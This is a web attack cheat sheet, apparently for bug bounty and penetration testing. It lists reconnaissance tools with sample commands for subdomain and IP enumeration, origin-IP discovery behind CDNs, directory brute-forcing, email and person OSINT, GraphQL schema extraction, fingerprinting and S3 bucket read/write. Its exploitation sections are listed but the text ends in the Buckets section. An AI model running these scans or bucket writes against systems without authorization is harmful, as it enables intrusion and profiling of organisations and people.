# Web Attack Cheat Sheet

## Table of Contents
- [Discovering](#discovering)
  - [Targets](#targets)
  - [IP Enumeration](#ip-enumeration)
  - [Subdomain Enumeration](#subdomain-enumeration)
  - [Cache](#cache)
  - [Web Asset Discovery](#web-asset-discovery)
  - [Wordlist](#wordlist)
  - [Directory Bruteforcing](#directory-bruteforcing)
  - [Parameter Bruteforcing](#parameter-bruteforcing)
  - [DNS and HTTP detection](#dns-and-http-detection)
  - [Acquisitions/Names/Addresses/Contacts/Emails/etc.](#acquisitionsnamesaddressescontactsemailsetc)
  - [Google Dorks](#google-dorks)
  - [Content Security Policy (CSP)](#content-security-policy-csp)
  - [Tiny URLs Services](#tiny-urls-services)
  - [GraphQL](#graphql)
  - [General](#general)
- [Enumerating](#enumerating)
  - [Fingerprint](#fingerprint)
  - [Buckets](#buckets)
  - [Cloud Enumeration](#cloud-enumeration)
  - [Containerization](#containerization)
  - [Visual Identification](#visual-identification)
- [Scanning](#scanning)
  - [Static Application Security Testing](#static-application-security-testing)
  - [Dependency Confusion](#dependency-confusion)
  - [Send Emails](#send-emails)
  - [Search Vulnerabilities](#search-vulnerabilities)
  - [Web Scanning](#web-scanning)
  - [HTTP Request Smuggling](#http-request-smuggling)
  - [Subdomain Takeover](#subdomain-takeover)
  - [SQLi (SQL Injection)](#sqli-sql-injection)
  - [XSS](#xss)
  - [Repositories Scanning](#repositories-scanning)
  - [Secret Scanning](#secret-scanning)
  - [CORS Misconfigurations](#cors-misconfigurations)
  - [API](#api)
- [Monitoring](#monitoring)
  - [CVE](#cve)
- [Attacking](#attacking)
  - [Brute Force](#brute-force)
  - [Exfiltration](#exfiltration)
  - [Bypass](#bypass_attacking)
  - [General](#general_attacking)
- [Manual](#manual)
  - [Payloads](#payloads)
  - [Bypass](#bypass)
  - [Deserialization](#deserialization)
  - [SSRF (Server-Side Request Forgery)](#ssrf-server-side-request-forgery)
  - [OAuth](#oauth)
  - [DNS Rebinding](#dns-rebinding)
  - [SMTP Header Injection](#smtp-header-injection)
  - [Web Shell](#web-shell)
  - [Reverse Shell](#reverse-shell)
  - [SQLi (SQL Injection)](#sqli-sql-injection_manual)
  - [XSS](#xss_manual)
  - [XPath Injection](#xpath-injection)
  - [Path Traversal](#path-traversal)
  - [LFI (Local File Inclusion)](#lfi-local-file-inclusion)
  - [SSTI (Server Side Template Injection)](#ssti-server-side-template-injection)
  - [Information Disclosure](#information-disclosure)
  - [WebDAV (Web Distributed Authoring and Versioning)](#webdav-web-distributed-authoring-and-versioning)
  - [Generic Tools](#generic-tools)
- [AI](#ai)
- [General](#general_all)

## Discovering

### Targets
https://github.com/arkadiyt/bounty-targets-data
<br># This repo contains data dumps of Hackerone and Bugcrowd scopes (i.e. the domains that are eligible for bug bounty reports).

https://chaos.projectdiscovery.io
<br># We actively collect and maintain internet-wide assets' data, this project is meant to enhance research and analyse changes around DNS for better insights.

https://chaos-data.projectdiscovery.io/index.json
<br># Project Discovery Chaos Data

https://learn.microsoft.com/en-us/exchange/client-developer/web-service-reference/getfederationinformation-operation-soap
<br># The GetFederationInformation operation provides information about the federation status of the organization, such as the target URI to be used when requesting tokens that are targeted at this organization, and the other domains that the organization has also federated.
```
$ curl -s -X POST -H $'Content-Type: text/xml; charset=utf-8' -H $'SOAPAction: \"http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformation\"' -H $'User-Agent: AutodiscoverClient' -H $'Connection: close' --data-binary $'<?xml version=\"1.0\" encoding=\"utf-8\"?>\x0d\x0a<soap:Envelope xmlns:exm=\"http://schemas.microsoft.com/exchange/services/2006/messages\" xmlns:ext=\"http://schemas.microsoft.com/exchange/services/2006/types\" xmlns:a=\"http://www.w3.org/2005/08/addressing\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\">\x0d\x0a\x09<soap:Header>\x0d\x0a\x09\x09<a:Action soap:mustUnderstand=\"1\">http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformation</a:Action>\x0d\x0a\x09\x09<a:To soap:mustUnderstand=\"1\">https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc</a:To>\x0d\x0a\x09\x09<a:ReplyTo>\x0d\x0a\x09\x09\x09<a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>\x0d\x0a\x09\x09</a:ReplyTo>\x0d\x0a\x09</soap:Header>\x0d\x0a\x09<soap:Body>\x0d\x0a\x09\x09<GetFederationInformationRequestMessage xmlns=\"http://schemas.microsoft.com/exchange/2010/Autodiscover\">\x0d\x0a\x09\x09\x09<Request>\x0d\x0a\x09\x09\x09\x09<Domain>contoso.com</Domain>\x0d\x0a\x09\x09\x09</Request>\x0d\x0a\x09\x09</GetFederationInformationRequestMessage>\x0d\x0a\x09</soap:Body>\x0d\x0a</soap:Envelope>' https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc | xmllint --format -
<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" xmlns:a="http://www.w3.org/2005/08/addressing">
  <s:Header>
    <a:Action s:mustUnderstand="1">http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformationResponse</a:Action>
    <h:ServerVersionInfo xmlns:h="http://schemas.microsoft.com/exchange/2010/Autodiscover" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
      <h:MajorVersion>15</h:MajorVersion>
      <h:MinorVersion>20</h:MinorVersion>
      <h:MajorBuildNumber>7316</h:MajorBuildNumber>
      <h:MinorBuildNumber>39</h:MinorBuildNumber>
      <h:Version>Exchange2015</h:Version>
    </h:ServerVersionInfo>
  </s:Header>
  <s:Body>
    <GetFederationInformationResponseMessage xmlns="http://schemas.microsoft.com/exchange/2010/Autodiscover">
      <Response xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
        <ErrorCode>NoError</ErrorCode>
        <ErrorMessage/>
        <ApplicationUri>outlook.com</ApplicationUri>
        <Domains>
          <Domain>contoso.com</Domain>
          <Domain>CONTOSO18839.onmicrosoft.com</Domain>
          <Domain>contoso18839.microsoftonline.com</Domain>
        </Domains>
        <TokenIssuers>
          <TokenIssuer>
            <Endpoint>https://login.microsoftonline.com/extSTS.srf</Endpoint>
            <Uri>urn:federation:MicrosoftOnline</Uri>
          </TokenIssuer>
        </TokenIssuers>
      </Response>
    </GetFederationInformationResponseMessage>
  </s:Body>
</s:Envelope>
```

### IP Enumeration
http://www.asnlookup.com
<br># This tool leverages ASN to look up IP addresses (IPv4 & IPv6) owned by a specific organization for reconnaissance purposes.

https://github.com/pielco11/fav-up
<br># Lookups for real IP starting from the favicon icon and using Shodan.
<br>```python3 favUp.py --favicon-file favicon.ico -sc```

https://stackoverflow.com/questions/16986879/bash-script-to-list-all-ips-in-prefix
<br># List all IP addresses in a given CIDR block
<br>```nmap -sL -n 10.10.64.0/27 | awk '/Nmap scan report/{print $NF}'```

https://kaeferjaeger.gay/?dir=cdn-ranges/
<br># Lists of IP ranges used by CDNs (Cloudflare, Akamai, Incapsula, Fastly, etc). Updated every 30 minutes.

https://kaeferjaeger.gay/?dir=ip-ranges/
<br># Lists of IP ranges from: Google (Cloud & GoogleBot), Bing (Bingbot), Amazon (AWS), Microsoft (Azure), Oracle (Cloud) and DigitalOcean. Updated every 6 hours.

https://netlas.io/
<br># Internet intelligence apps that provide accurate technical information on IP addresses, domain names, websites, web applications, IoT devices, and other online assets.

https://github.com/zidansec/CloudPeler
<br># This tools can help you to see the real IP behind CloudFlare protected websites.

https://github.com/christophetd/CloudFlair
<br># CloudFlair is a tool to find origin servers of websites protected by CloudFlare (or CloudFront) which are publicly exposed and don't appropriately restrict network access to the relevant CDN IP ranges.

https://github.com/projectdiscovery/cdncheck
<br># cdncheck is a tool for identifying the technology associated with dns / ip network addresses.

https://github.com/Warflop/cloudbunny
<br># CloudBunny is a tool to capture the origin server that uses a WAF as a proxy or protection.

https://github.com/projectdiscovery/mapcidr
<br># Utility program to perform multiple operations for a given subnet/CIDR ranges.
<br>```mapcidr -cidr 173.0.84.0/24 -sbc 10 -silent```

https://github.com/musana/CF-Hero
<br># CF-Hero is a reconnaissance tool that uses multiple data sources to discover the origin IP addresses of Cloudflare-protected web applications.
<br>```cat domains.txt | cf-hero```

### Subdomain Enumeration
https://web.archive.org/web/20211127183642/https://appsecco.com/books/subdomain-enumeration/
<br># This book intendes to be a reference for subdomain enumeration techniques.

https://celes.in/posts/cloudflare_ns_whois
<br># Enumerating all domains from a cloudflare account by nameserver correlation.

https://pugrecon.com/
<br># Query some subdomains!

https://github.com/knownsec/ksubdomain
<br># ksubdomain是一款基于无状态子域名爆破工具，支持在Windows/Linux/Mac上使用，它会很快的进行DNS爆破，在Mac和Windows上理论最大发包速度在30w/s,linux上为160w/s的速度。
<br>```ksubdomain -d example.com```

https://github.com/OWASP/Amass
<br># The OWASP Amass Project performs network mapping of attack surfaces and external asset discovery using open source information gathering and active reconnaissance techniques.
<br>```amass enum -passive -dir /tmp/amass_output/ -d example.com -o dir/example.com```

https://github.com/projectdiscovery/subfinder
<br># subfinder is a subdomain discovery tool that discovers valid subdomains for websites by using passive online sources.
<br>```subfinder -r 8.8.8.8,8.8.4.4,1.1.1.1,1.0.0.1 -t 10 -v -d example.com -o dir/example.com```

https://github.com/infosec-au/altdns
<br># Altdns is a DNS recon tool that allows for the discovery of subdomains that conform to patterns. Altdns takes in words that could be present in subdomains under a domain (such as test, dev, staging) as well as takes in a list of subdomains that you know of.
<br>```altdns -i subdomains.txt -o data_output -w words.txt -r -s results_output.txt```

https://github.com/Josue87/gotator
<br># Gotator is a tool to generate DNS wordlists through permutations.
<br>```gotator -sub domains.txt -perm permutations.txt -depth 2 -numbers 5 > output.txt```

https://github.com/nsonaniya2010/SubDomainizer
<br># SubDomainizer is a tool designed to find hidden subdomains and secrets present is either webpage, Github, and external javascripts present in the given URL.
<br>```python3 SubDomainizer.py -u example.com -o dir/example.com```

https://github.com/projectdiscovery/uncover
<br># uncover is a go wrapper using APIs of well known search engines to quickly discover exposed hosts on the internet.

https://dns.bufferover.run/dns?q=example.com
<br># Powered by DNSGrep (https://github.com/erbbysam/DNSGrep)
<br># A utility for quickly searching presorted DNS names. Built around the Rapid7 rdns & fdns dataset.

https://crt.sh/?q=example.com
<br># Certificate Search

https://censys.io/certificates?q=parsed.subject_dn%3AO%3DExample+Organization
<br># Censys is the most reputable, exhaustive, and up-to-date source of Internet scan data in the world, so you see everything.

https://www.shodan.io/search?query=ssl%3AExample
<br># Shodan is the world's first search engine for Internet-connected devices.

https://fullhunt.io/
<br># If you don't know all your internet-facing assets, which ones are vulnerable, FullHunt is here for you.

https://github.com/xiecat/fofax
<br># fofax is a fofa query tool written in go, positioned as a command-line tool and characterized by simplicity and speed.
<br>```fofax -q 'app="APACHE-Solr"'```

https://publicwww.com
<br># Find any alphanumeric snippet, signature or keyword in the web pages HTML, JS and CSS code.

https://en.fofa.info
<br># FOFA is a search engine for global cyberspace mapping belonging to Beijing Huashun Xin'an Technology Co., Ltd.
<br># Through continuous active detection of global Internet assets, more than 4 billion assets and more than 350,000 fingerprint rules have been accumulated, identifying most software and hardware network assets. Asset data supports external presentation and application in various ways and can perform hierarchical portraits of assets based on IP.

https://getodin.com/
<br># ODIN is a powerful internet scanning tool that empowers users with real-time threat detection, comprehensive vulnerability assessment, and smart, fast, and free capabilities, making it a versatile solution for enhancing cybersecurity.

https://www.zoomeye.org
<br># ZoomEyeis China's first and world-renowned cyberspace search engine driven by 404 Laboratory of Knownsec. Through a large number of global surveying and mapping nodes, according to the global IPv4, IPv6 address and website domain name databases，it can continuously scan and identify multiple service port and protocols 24 hours a day, and finally map the whole or local cyberspace.

https://securitytrails.com/list/email/dns-admin.example.com
<br># Total Internet Inventory with the most comprehensive data that informs with unrivaled accuracy.
<br>```curl --request POST --url 'https://api.securitytrails.com/v1/domains/list?apikey={API_Key}&page=1&scroll=true' --data '{"filter":{"apex_domain":"example.com"}}' | jq -Mr '.records[].hostname' >> subdomains.txt```
<br>```curl --request POST --url 'https://api.securitytrails.com/v1/domains/list?apikey={API_Key}&page=1&scroll=true' --data '{"filter":{"whois_email":"domains@example.com"}}' | jq -Mr '.records[].hostname' >> domains.txt```

https://profundis.io/
<br># Profundis is a search engine which focuses on indexing hosts and DNS records rather than web pages. You may use it to discover new assets or get alerts when a new host which matches specific criteria is discovered.

https://viewdns.info/reversewhois
<br># This free tool will allow you to find domain names owned by an individual person or company.

https://www.whoxy.com
<br># Our WHOIS API returns consistent and well-structured WHOIS data in XML & JSON format. Returned data contain parsed WHOIS fields that can be easily understood by your application.

https://github.com/MilindPurswani/whoxyrm
<br># A reverse whois tool based on Whoxy API based on @jhaddix's talk on Bug Hunter's Methodology v4.02.
<br>```whoxyrm -company-name "Example Inc."```

https://opendata.rapid7.com/
<br># Offering researchers and community members open access to data from Project Sonar, which conducts internet-wide surveys to gain insights into global exposure to common vulnerabilities.

https://openintel.nl/
<br># The goal of the OpenINTEL measurement platform is to capture daily snapshots of the state of large parts of the global Domain Name System. Because the DNS plays a key role in almost all Internet services, recording this information allows us to track changes on the Internet, and thus its evolution, over longer periods of time. By performing active measurements, rather than passively collecting DNS data, we build consistent and reliable time series of the state of the DNS.

https://github.com/ninoseki/mihari
<br># Mihari is a framework for continuous OSINT based threat hunting.

https://github.com/ProjectAnte/dnsgen
<br># This tool generates a combination of domain names from the provided input. Combinations are created based on wordlist. Custom words are extracted per execution.

https://github.com/resyncgg/ripgen
<br># A rust-based version of the popular dnsgen python utility.

https://github.com/d3mondev/puredns
<br># Fast domain resolver and subdomain bruteforcing with accurate wildcard filtering.

https://github.com/projectdiscovery/dnsx
<br># Fast and multi-purpose DNS toolkit allow to run multiple DNS queries.

https://github.com/glebarez/cero
<br># Cero will connect to remote hosts, and read domain names from the certificates provided during TLS handshake.

https://cramppet.github.io/regulator/index.html
<br># Regulator: A unique method of subdomain enumeration

https://github.com/blechschmidt/massdns
<br># MassDNS is a simple high-performance DNS stub resolver targeting those who seek to resolve a massive amount of domain names in the order of millions or even billions.
<br>```massdns -r resolvers.txt -o S -w massdns.out subdomains.txt```

https://github.com/c3l3si4n/pugdns/
<br># An experimental high-performance DNS query tool built with AF_XDP and eBPF for extremely fast and accurate bulk DNS lookups.

https://github.com/trickest/resolvers
<br># The most exhaustive list of reliable DNS resolvers.

https://github.com/vortexau/dnsvalidator
<br># Maintains a list of IPv4 DNS servers by verifying them against baseline servers, and ensuring accurate responses.
<br>```dnsvalidator -tL https://public-dns.info/nameservers.txt -threads 20 -o resolvers.txt```

https://github.com/n0kovo/n0kovo_subdomains
<br># An extremely effective subdomain wordlist of 3,000,000 lines, crafted by harvesting SSL certs from the entire IPv4 space.

https://github.com/hdm/ctail
<br># Tail Certificate Transparency logs and extract hostnames.
<br>```ctail -f -m '^.*\.example\.com'```

https://labs.detectify.com/how-to/advanced-subdomain-reconnaissance-how-to-enhance-an-ethical-hackers-easm/
<br># Many EASM programs limit the effectiveness of subdomain enumeration by relying solely on pre-made tools. The following techniques show how ethical hackers can expand their EASM program beyond the basics and build the best possible subdomain asset inventory.

### Cache
https://portswigger.net/research/practical-web-cache-poisoning
<br># Web cache poisoning has long been an elusive vulnerability, a 'theoretical' threat used mostly to scare developers into obediently patching issues that nobody could actually exploit.
<br># In this paper I'll show you how to compromise websites by using esoteric web features to turn their caches into exploit delivery systems, targeting everyone that makes the mistake of visiting their homepage.

https://www.giftofspeed.com/cache-checker
<br># This tool lists which web files on a website are cached and which are not. Furthermore it checks by which method these files are cached and what the expiry time of the cached files is.

https://youst.in/posts/cache-poisoning-at-scale/
<br># Even though Web Cache Poisoning has been around for years, the increasing complexity in technology stacks constantly introduces unexpected behaviour which can be abused to achieve novel cache poisoning attacks. In this paper I will present the techniques I used to report over 70 cache poisoning vulnerabilities to various Bug Bounty programs.

https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner
<br># Web Cache Vulnerability Scanner (WCVS) is a fast and versatile CLI scanner for web cache poisoning developed by Hackmanit.
<br>```wcvs -u https://example.com -hw "file:/home/user/Documents/wordlist-header.txt" -pw "file:/home/user/Documents/wordlist-parameter.txt"```

### Web Asset Discovery
https://github.com/tomnomnom/waybackurls
<br># Accept line-delimited domains on stdin, fetch known URLs from the Wayback Machine for *.domain and output them on stdout.
<br>```cat subdomains.txt | waybackurls > waybackurls.txt```

https://github.com/tomnomnom/hacks
<br># Hacky one-off scripts, tests etc.
<br>```cat waybackurls.txt | go run /root/Tools/hacks/anti-burl/main.go | tee waybackurls_valid.txt```

https://github.com/lc/gau
<br># getallurls (gau) fetches known URLs from AlienVault's Open Threat Exchange, the Wayback Machine, and Common Crawl for any given domain.
<br>```cat domains.txt | gau --threads 5```

https://github.com/xnl-h4ck3r/waymore
<br># The idea behind waymore is to find even more links from the Wayback Machine than other existing tools.
<br>```waymore -n -mode U -p 5 -i https://example.com```

https://github.com/projectdiscovery/urlfinder
<br># A high-speed tool for passively gathering URLs, optimized for efficient web asset discovery without active scanning.
<br>```urlfinder -duc -silent -d example.com```

https://github.com/jaeles-project/gospider
<br># Fast web spider written in Go.
<br>```gospider -s "https://example.com/" -o output -c 20 -d 10```

https://github.com/xnl-h4ck3r/xnLinkFinder
<br># This is a tool used to discover endpoints (and potential parameters) for a given target.

https://github.com/hakluke/hakrawler
<br># Fast golang web crawler for gathering URLs and JavaScript file locations. This is basically a simple implementation of the awesome Gocolly library.
<br>```echo https://example.com | hakrawler```

https://github.com/projectdiscovery/katana
<br># A next-generation crawling and spidering framework.
<br>```katana -u https://example.com```

https://geotargetly.com/geo-browse
<br># Geo Browse is a tool designed to capture screenshots of your website from different countries.

https://commoncrawl.org/
<br># We build and maintain an open repository of web crawl data that can be accessed and analyzed by anyone.

https://github.com/bitquark/shortscan
<br># Shortscan is designed to quickly determine which files with short filenames exist on an IIS webserver. Once a short filename has been identified the tool will try to automatically identify the full filename.
<br>```shortscan https://example.com/```

### Wordlist
https://portswigger.net/bappstore/21df56baa03d499c8439018fe075d3d7
<br># Scrapes all unique words and numbers for use with password cracking.

https://github.com/ameenmaali/wordlistgen
<br># wordlistgen is a tool to pass a list of URLs and get back a list of relevant words for your wordlists.
<br>```cat hosts.txt | wordlistgen```

https://github.com/danielmiessler/SecLists
<br># SecLists is the security tester's companion. It's a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.

https://github.com/swisskyrepo/PayloadsAllTheThings
<br># A list of useful payloads and bypasses for Web Application Security. Feel free to improve with your payloads and techniques.

https://github.com/fuzzdb-project/fuzzdb
<br># FuzzDB was created to increase the likelihood of finding application security vulnerabilities through dynamic application security testing.

https://github.com/google/fuzzing
<br># This project aims at hosting tutorials, examples, discussions, research proposals, and other resources related to fuzzing.

https://wordlists.assetnote.io
<br># This website provides you with wordlists that are up to date and effective against the most popular technologies on the internet.

https://github.com/trickest/wordlists
<br># Real-world infosec wordlists, updated regularly.

https://github.com/the-xentropy/samlists
<br># The wordlists are created by trawling through huge public datasets. The methods employed are a bit different based on the noisiness of the data source.

### Directory Bruteforcing
https://github.com/ffuf/ffuf
<br># A fast web fuzzer written in Go.
<br>```ffuf -H 'User-Agent: Mozilla' -v -t 30 -w mydirfilelist.txt -b 'NAME1=VALUE1; NAME2=VALUE2' -u 'https://example.com/FUZZ'```

https://github.com/jthack/ffufai
<br># ffufai is an AI-powered wrapper for the popular web fuzzer ffuf. It automatically suggests file extensions for fuzzing based on the target URL and its headers, using either OpenAI's GPT or Anthropic's Claude AI models.
<br>```ffufai -u https://example.com/FUZZ -w /path/to/wordlist.txt```

https://github.com/iustin24/chameleon
<br># Chameleon provides better content discovery by using wappalyzer's set of technology fingerprints alongside custom wordlists tailored to each detected technologies.
<br>```chameleon --url https://example.com -a```

https://github.com/OJ/gobuster
<br># Gobuster is a tool used to brute-force.
<br>```gobuster dir -a 'Mozilla' -e -k -l -t 30 -w mydirfilelist.txt -c 'NAME1=VALUE1; NAME2=VALUE2' -u 'https://example.com/'```

https://github.com/tomnomnom/meg
<br># meg is a tool for fetching lots of URLs but still being 'nice' to servers.
<br>```meg -c 50 -H 'User-Agent: Mozilla' -s 200 weblogic.txt example.txt weblogic```

https://github.com/deibit/cansina
<br># Cansina is a Web Content Discovery Application.
<br>```python3 cansina.py -u 'https://example.com/' -p mydirfilelist.txt --persist```

https://github.com/epi052/feroxbuster
<br># A simple, fast, recursive content discovery tool written in Rust.
<br>```feroxbuster -u 'https://example.com/' -x pdf -x js,html -x php txt json,docx```

https://github.com/projectdiscovery/httpx
<br># httpx is a fast and multi-purpose HTTP toolkit allow to run multiple probers using retryablehttp library, it is designed to maintain the result reliability with increased threads.
<br>```cat hosts.txt | httpx```

https://github.com/assetnote/kiterunner
<br># Kiterunner is a tool that is capable of not only performing traditional content discovery at lightning fast speeds, but also bruteforcing routes/endpoints in modern applications.

### Parameter Bruteforcing
https://github.com/s0md3v/Arjun
<br># Arjun can find query parameters for URL endpoints.
<br>```arjun -u https://example.com/```

https://github.com/Sh1Yo/x8
<br># Hidden parameters discovery suite written in Rust.
<br>```x8 -u "https://example.com/" -w <wordlist>```

### DNS and HTTP detection
https://ceye.io
<br># Monitor service for security testing.
<br>```curl http://api.ceye.io/v1/records?token={API Key}&type=dns
curl http://api.ceye.io/v1/records?token={API Key}&type=http```

https://portswigger.net/burp/documentation/collaborator
<br># Burp Collaborator is a network service that Burp Suite uses to help discover many kinds of vulnerabilities.
<br># Tip https://www.onsecurity.co.uk/blog/gaining-persistent-access-to-burps-collaborator-sessions

https://httpbin.org/
<br># A simple HTTP Request & Response Service.

http://pingb.in
<br># Simple DNS and HTTP service for security testing.

https://github.com/ctxis/SnitchDNS
<br># SnitchDNS is a database driven DNS Server with a Web UI, written in Python and Twisted, that makes DNS administration easier with all configuration changed applied instantly without restarting any system services.

http://dnslog.cn
<br># Simple DNS server with realitme logs.

https://interact.projectdiscovery.io/
<br># Interactsh is an Open-Source Solution for Out of band Data Extraction, A tool designed to detect bugs that cause external interactions, For example - Blind SQLi, Blind CMDi, SSRF, etc.

https://canarytokens.org/
<br># You'll be familiar with web bugs, the transparent images which track when someone opens an email. They work by embedding a unique URL in a page's image tag, and monitoring incoming GET requests.
<br># Imagine doing that, but for file reads, database queries, process executions or patterns in log files. Canarytokens does all this and more, letting you implant traps in your production systems rather than setting up separate honeypots.

https://webhook.site/
<br># With Webhook.site, you instantly get a unique, random URL and e-mail address. Everything that's sent to these addresses are shown instantly. With this, you can test and debug Webhooks and HTTP requests, as well as create your own workflows using the Custom Actions graphical editor or WebhookScript, a simple scripting language, to transform, validate and process HTTP requests in a variety of ways – without setting up and maintaining your own infrastructure.

### Acquisitions/Names/Addresses/Contacts/Emails/etc.
https://hunter.io
<br># Hunter lets you find email addresses in seconds and connect with the people that matter for your business.

https://intelx.io
<br># Intelligence X is an independent European technology company founded in 2018 by Peter Kleissner. The company is based in Prague, Czech Republic. Its mission is to develop and maintain the search engine and data archive.

https://www.nerdydata.com
<br># Find companies based on their website's tech stack or code.

https://github.com/khast3x/h8mail
<br># h8mail is an email OSINT and breach hunting tool using different breach and reconnaissance services, or local breaches such as Troy Hunt's "Collection1" and the infamous "Breach Compilation" torrent.
<br>```h8mail -t target@example.com```

https://dashboard.fullcontact.com
<br># Our person-first Identity Resolution Platform provides the crucial intelligence needed to drive Media Amplification, Omnichannel Measurement, and Customer Recognition.

https://www.peopledatalabs.com
<br># Our data empowers developers to build innovative, trusted data-driven products at scale.

https://www.social-searcher.com
<br># Free Social Media Search Engine.

https://github.com/mxrch/GHunt
<br># GHunt is an OSINT tool to extract information from any Google Account using an email.
<br>```python3 ghunt.py email myemail@gmail.com```

### Google Dorks
https://docs.google.com/document/d/1ydVaJJeL1EYbWtlfj9TPfBTE5IBADkQfZrQaBZxqXGs/view
<br># Google Advanced Search Operators

https://www.exploit-db.com/google-hacking-database
<br># Google Hacking Database

https://github.com/opsdisk/pagodo
<br># The goal of this project was to develop a passive Google dork script to collect potentially vulnerable web pages and applications on the Internet.
<br>```python3 pagodo.py -d example.com -g dorks.txt -l 50 -s -e 35.0 -j 1.1```

https://github.com/Tobee1406/Awesome-Google-Dorks
<br># A collection of Awesome Google Dorks.

### Content Security Policy (CSP)
https://csp-evaluator.withgoogle.com/
<br># CSP Evaluator allows developers and security experts to check if a Content Security Policy (CSP) serves as a strong mitigation against cross-site scripting attacks.

### Tiny URLs Services
https://www.scribd.com/doc/308659143/Cornell-Tech-Url-Shortening-Research
<br># Cornell Tech Url Shortening Research

https://github.com/utkusen/urlhunter
<br># urlhunter is a recon tool that allows searching on URLs that are exposed via shortener services such as bit.ly and goo.gl.
<br>```urlhunter -keywords keywords.txt -date 2020-11-20 -o out.txt```

https://shorteners.grayhatwarfare.com
<br># Search Shortener Urls

### GraphQL
https://github.com/doyensec/graph-ql
<br># A security testing tool to facilitate GraphQL technology security auditing efforts.

https://hackernoon.com/understanding-graphql-part-1-nxm3uv9
<br># Understanding GraphQL

https://graphql.org/learn/introspection/
<br># It's often useful to ask a GraphQL schema for information about what queries it supports. GraphQL allows us to do so using the introspection system!

https://github.com/nikitastupin/clairvoyance
<br># Obtain GraphQL API schema even if the introspection is disabled.
<br>```clairvoyance https://www.example.com/graphql -o schema.json```

https://jondow.eu/practical-graphql-attack-vectors/
<br># Practical GraphQL attack vectors

https://lab.wallarm.com/why-and-how-to-disable-introspection-query-for-graphql-apis/
<br># Why and how to disable introspection query for GraphQL APIs

https://lab.wallarm.com/securing-and-attacking-graphql-part-1-overview/
<br># Securing GraphQL

https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4
<br># GraphQL vs REST API model, common security test cases for GraphQL endpoints.

https://the-bilal-rizwan.medium.com/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696
<br># GraphQL common vulnerabilities & how to exploit them.

https://cybervelia.com/?p=736
<br># GraphQL exploitation – All you need to know.

https://portswigger.net/web-security/graphql
<br># GraphQL vulnerabilities generally arise due to implementation and design flaws.

https://github.com/forcesunseen/graphquail
<br># GraphQuail is a Burp Suite extension that offers a toolkit for testing GraphQL endpoints.

https://github.com/graphql-kit/graphql-voyager
<br># Represent any GraphQL API as an interactive graph.

https://github.com/assetnote/batchql
<br># BatchQL is a GraphQL security auditing script with a focus on performing batch GraphQL queries and mutations.

https://github.com/doyensec/inql
<br># InQL is a robust, open-source Burp Suite extension for advanced GraphQL testing, offering intuitive vulnerability detection, customizable scans, and seamless Burp integration.

https://github.com/dolevf/graphql-cop
<br># GraphQL Cop is a small Python utility to run common security tests against GraphQL APIs. GraphQL Cop is perfect for running CI/CD checks in GraphQL. It is lightweight, and covers interesting security issues in GraphQL.
<br>```graphql-cop.py -t https://www.example.com/graphql```

### General
https://github.com/redhuntlabs/Awesome-Asset-Discovery
<br># Asset Discovery is the initial phase of any security assessment engagement, be it offensive or defensive. With the evolution of information technology, the scope and definition of assets has also evolved.

https://spyse.com
<br># Spyse holds the largest database of its kind, containing a wide range of OSINT data handy for the reconnaissance.

https://github.com/yogeshojha/rengine
<br># reNgine is an automated reconnaissance framework meant for information gathering during penetration testing of web applications.

https://github.com/phor3nsic/favicon_hash_shodan
<br># Search for a framework by favicon

https://github.com/righettod/website-passive-reconnaissance
<br># Script to automate, when possible, the passive reconnaissance performed on a website prior to an assessment.

https://dhiyaneshgeek.github.io/red/teaming/2022/04/28/reconnaissance-red-teaming/
<br># Reconnaissance is carried out in a Red Teaming Engagement.

https://learn.microsoft.com/en-us/rest/api/storageservices/list-blobs?tabs=azure-ad
<br># The List Blobs operation returns a list of the blobs under the specified container.
<br>```https://myaccount.blob.core.windows.net/mycontainer?restype=container&comp=list```

https://github.com/hakluke/hakoriginfinder
<br># Tool for discovering the origin host behind a reverse proxy. Useful for bypassing WAFs and other reverse proxies.
<br>```prips 93.184.216.0/24 | hakoriginfinder -h https://example.com:443/foo```

## Enumerating

### Fingerprint
https://github.com/urbanadventurer/WhatWeb
<br># WhatWeb identifies websites. Its goal is to answer the question, "What is that Website?". WhatWeb recognises web technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices.
<br>```whatweb -a 4 -U 'Mozilla' -c 'NAME1=VALUE1; NAME2=VALUE2' -t 20 www.example.com```

https://builtwith.com
<br># Find out what websites are Built With.

https://www.wappalyzer.com
<br># Identify technologies on websites.

https://github.com/s0md3v/wappalyzer-next
<br># This project is a command line tool and python library that uses Wappalyzer extension (and its fingerprints) to detect technologies.
<br>```wappalyzer -i https://example.com```

https://webtechsurvey.com
<br># Discover what technologies a website is built on or find out what websites use a particular web technology.

https://portswigger.net/bappstore/c9fb79369b56407792a7104e3c4352fb
<br># Software Vulnerability Scanner Burp Extension

https://github.com/GrrrDog/weird_proxies
<br># It's a cheat sheet about behaviour of various reverse proxies and related attacks.

### Buckets
https://aws.amazon.com/cli/
<br># List s3 bucket permissions and keys
<br>```aws s3api get-bucket-acl --bucket examples3bucketname```
<br>```aws s3api get-object-acl --bucket examples3bucketname --key dir/file.ext```
<br>```aws s3api list-objects --bucket examples3bucketname```
<br>```aws s3api list-objects-v2 --bucket examples3bucketname```
<br>```aws s3api get-object --bucket examples3bucketname --key dir/file.ext localfilename.ext```
<br>```aws s3api put-object --bucket examples3bucketname --key dir/file.ext --body localfilename.ext```

https://github.com/eth0izzle/bucket-stream
<br># Find interesting Amazon S3 Buckets by watching certificate transparency logs

https://buckets.grayhatwarfare.com/
<br># Search Public Buckets

https://s3digger.com/
